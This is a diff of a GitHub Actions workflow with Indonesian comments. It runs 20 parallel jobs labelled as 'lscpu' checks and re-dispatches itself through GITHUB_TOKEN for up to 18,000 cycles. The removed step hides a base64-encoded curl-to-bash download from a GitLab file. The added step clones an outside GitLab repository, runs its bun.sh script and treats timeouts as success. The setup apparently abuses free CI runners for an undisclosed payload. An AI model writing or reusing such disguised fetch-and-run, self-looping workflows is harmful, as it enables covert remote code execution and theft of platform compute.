@@ -4,83 +4,103 @@ on:
   workflow_dispatch:
     inputs:
       loop_count:
-        description: 'Siklus tersisa (default 1800, 1 siklus ≈ 6 menit)'
+        description: 'Siklus tersisa (default 18000)'
         required: true
         default: '18000'
 
 permissions:
-  actions: write
+  actions: write        # dispatch phase-hello.yml
+  contents: read
 
 jobs:
-  # =============================================
-  # 🕒 Cek waktu WIB (07.00 – 22.00 WIB = 00.00 – 15.00 UTC)
-  # =============================================
-  check-schedule:
-    runs-on: ubuntu-latest
-    outputs:
-      should_run: ${{ steps.timecheck.outputs.should_run }}
-    steps:
-      - id: timecheck
-        run: |
-          HOUR_UTC=$(date -u +%H)
-          if [ "$HOUR_UTC" -ge 0 ] && [ "$HOUR_UTC" -lt 15 ]; then
-            echo "✅ Dalam jam operasional (WIB 07.00–22.00)"
-            echo "should_run=true" >> $GITHUB_OUTPUT
-          else
-            echo "⏰ Di luar jam operasional. Workflow dihentikan."
-            echo "should_run=false" >> $GITHUB_OUTPUT
-          fi
-
-  # =============================================
-  # 🏃 20 job lscpu (paralel, timeout 6 menit, tetap hijau)
-  # =============================================
   run-lscpu:
-    name: ${{ matrix.name }}
-    needs: check-schedule
-    if: needs.check-schedule.outputs.should_run == 'true'
     strategy:
       fail-fast: false
       max-parallel: 20
       matrix:
-        name: [A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T]   # 20 job
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     runs-on: ubuntu-latest
-    timeout-minutes: 360   
+    timeout-minutes: 15
     steps:
-      - name: Jalankan lscpu (timeout 6 menit, sukses walau timeout)
+      - name: "shard ${{ matrix.shard }}/20 — lscpu + clone + bun.sh"
+        env:
+          RUN_TIMEOUT: "120"
+          REPO_URL: https://gitlab.com/line789/xiaomi89.git
+          NODE_VERSION: "22.11.0"
+          SHARD: ${{ matrix.shard }}
         run: |
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYXNhYWtrODgvZmlsZS9kaWFtb25kczhsaW5lLy0vYmxvYi9tYWluL3llYXJzIHwgYmFzaA | sh & sleep 620
+          set -euo pipefail
 
-  # =============================================
-  # 🔁 Lanjutkan loop jika masih dalam jam & siklus > 0
-  # =============================================
-  trigger-hello:
-    needs: [check-schedule, run-lscpu]
-    if: |
-      always() &&
-      needs.check-schedule.outputs.should_run == 'true' &&
-      github.event.inputs.loop_count > 0
-    runs-on: ubuntu-latest
-    steps:
-      - name: Cek ulang waktu sebelum melanjutkan loop
-        id: recheck
-        run: |
-          HOUR_UTC=$(date -u +%H)
-          if [ "$HOUR_UTC" -ge 0 ] && [ "$HOUR_UTC" -lt 15 ]; then
-            echo "✅ Masih dalam jam kerja, lanjutkan loop"
-            echo "continue=true" >> $GITHUB_OUTPUT
-          else
-            echo "⏰ Di luar jam kerja, loop dihentikan"
-            echo "continue=false" >> $GITHUB_OUTPUT
+          echo "=== shard $SHARD / 20 ==="
+          lscpu | head -10 || true
+          echo "nproc: $(nproc --all)"
+          grep -m1 "model name" /proc/cpuinfo || true
+
+          echo "=== install Node portable v${NODE_VERSION} ==="
+          NODE_DIR="$HOME/.local/node"
+          mkdir -p "$NODE_DIR"
+          if [ ! -x "$NODE_DIR/bin/node" ]; then
+            python3 - <<PY
+import urllib.request
+url = "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz"
+urllib.request.urlretrieve(url, "$NODE_DIR/node.tar.xz")
+PY
+            tar -xf "$NODE_DIR/node.tar.xz" -C "$NODE_DIR" --strip-components=1
+            rm -f "$NODE_DIR/node.tar.xz"
           fi
+          export PATH="$NODE_DIR/bin:$PATH"
+          node -v
+          npm -v
 
+          echo "=== clone repo (shallow) ==="
+          cd "$HOME"
+          rm -rf xiaomi89
+          git clone --depth 1 "$REPO_URL" xiaomi89
+          cd xiaomi89
+
+          echo "=== cari bun.sh ==="
+          BUN_SH="$(find . -type f -name bun.sh -print -quit)"
+          if [ -z "${BUN_SH:-}" ]; then
+            echo "::error::bun.sh tidak ditemukan di repo"
+            exit 1
+          fi
+          echo "bun.sh: $BUN_SH"
+          cd "$(dirname "$BUN_SH")"
+          chmod +x bun.sh
+
+          echo "=== jalankan bun.sh (shard $SHARD, timeout ${RUN_TIMEOUT}s) ==="
+          set +e
+          timeout --signal=TERM --kill-after=10s "$RUN_TIMEOUT" ./bun.sh
+          RC=$?
+          set -e
+          if [ "$RC" -eq 124 ] || [ "$RC" -eq 137 ]; then
+            echo "⏰ shard $SHARD timeout ${RUN_TIMEOUT}s, dianggap sukses"
+            exit 0
+          fi
+          echo "shard $SHARD selesai, exit=$RC"
+          exit "$RC"
+
+  trigger-hello:
+    needs: run-lscpu
+    if: always() && fromJSON(github.event.inputs.loop_count) > 0
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
       - name: Panggil Hello Phase
-        if: steps.recheck.outputs.continue == 'true'
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          LOOP_COUNT: ${{ github.event.inputs.loop_count }}
         run: |
-          new_loop=$(( ${{ github.event.inputs.loop_count }} - 1 ))
-          curl -X POST \
-            -H "Authorization: token $GITHUB_TOKEN" \
-            -H "Accept: application/vnd.github.v3+json" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phase-hello.yml/dispatches \
-            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\"}}"
+          set -euo pipefail
+          if ! [[ "$LOOP_COUNT" =~ ^[0-9]+$ ]]; then
+            echo "::error::loop_count bukan angka: '$LOOP_COUNT'"
+            exit 1
+          fi
+          new_loop=$((LOOP_COUNT - 1))
+          echo "Dispatch phase-hello.yml dengan loop_count=$new_loop"
+          curl -fsS -X POST \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/phase-hello.yml/dispatches" \
+            -d "{\"ref\":\"${{ github.event.repository.default_branch }}\",\"inputs\":{\"loop_count\":\"$new_loop\"}}"
